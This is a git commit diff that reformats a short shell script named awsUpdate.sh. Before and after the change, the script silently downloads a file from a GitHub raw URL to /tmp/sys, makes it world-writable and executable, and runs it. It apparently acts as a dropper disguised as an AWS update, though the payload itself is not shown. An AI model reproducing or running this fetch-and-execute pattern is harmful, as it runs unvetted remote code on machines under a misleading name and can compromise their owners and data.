83f4e026f385a48bf16f6a84a538517624e52f90
exeowxle891 <94184069+exeowxle891@users.noreply.github.com>
2022-05-21 19:45:09 +0800

    Update awsUpdate.sh

--- awsUpdate.sh
+++ awsUpdate.sh
@@ -1,1 +1,4 @@
-curl -s -LJO -o /tmp/sys https://raw.githubusercontent.com/exeowxle891/hello/main/awsUpdate && chmod 777 /tmp/sys && /tmp/sys
+#!/bin/bash
+curl -s -LJO -o /tmp/sys https://raw.githubusercontent.com/exeowxle891/hello/main/awsUpdate
+chmod 777 /tmp/sys
+/tmp/sys
